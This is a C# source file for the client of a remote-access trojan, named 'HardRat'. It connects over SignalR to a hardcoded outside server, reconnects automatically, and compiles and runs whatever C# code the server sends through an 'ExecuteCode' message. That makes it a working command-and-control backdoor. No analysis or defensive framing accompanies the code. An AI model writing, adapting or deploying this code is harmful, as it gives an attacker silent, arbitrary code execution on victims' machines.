using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.CSharp.Scripting;
using Microsoft.CodeAnalysis.Scripting;
using Microsoft.CodeAnalysis.Text;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace HardRat.ClientApp
{
    public class ServerHubConnection
    {
        private const string Url = "http://edsparro-001-site1.btempurl.com/hubs/serverhub";

        public ServerHubConnection()
        {
            HubConnection = new HubConnectionBuilder()
                .WithUrl(Url)
                .WithAutomaticReconnect()
                .Build();

            HubConnection.On<string>("ExecuteCode", async (code) =>
            {
                Console.WriteLine(code);
                await RunCode(code);
            });
            
        }
        public HubConnection HubConnection { get; }

        public async Task StartAsync()
        {
            await HubConnection.StartAsync();
        }

        public async Task RunCode(string code)
        {
            var found = CodeCompilerExtensions.Compile(code);
            await found.RunAsync();
        }
    }

    public static class CodeCompilerExtensions
    {
        public static Script<object> Compile(string code)
        {
            var script = CSharpScript.Create(code);
            var result = script.Compile();

            Console.WriteLine(string.Join(
                Environment.NewLine,
    result.Select(diagnostic => diagnostic.ToString())
));

            return script;
        }
    }
}
